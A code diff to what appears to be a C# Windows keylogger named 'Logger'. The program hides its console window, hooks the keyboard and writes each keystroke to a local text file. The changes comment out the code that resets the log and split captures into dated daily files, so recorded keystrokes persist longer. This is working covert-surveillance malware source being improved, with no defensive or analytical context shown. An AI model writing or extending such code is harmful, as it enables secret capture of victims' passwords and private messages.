@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Windows.Forms;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -10,11 +10,13 @@ namespace Logger
     {
         static void Main(string[] args)
         {
+            //do not clear preserve log
+            /*
             if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt"))
             {
                 File.WriteAllText(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", "");
             }
-
+            */
             var handle = GetConsoleWindow();
 
             ShowWindow(handle, SW_HIDE);
@@ -52,7 +54,7 @@ namespace Logger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
-                StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);
+                StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log-" + DateTime.Now.ToString("yyyyMMdd") + ".txt", true);
 
                 string key = Convert.ToString((Keys)vkCode);
 
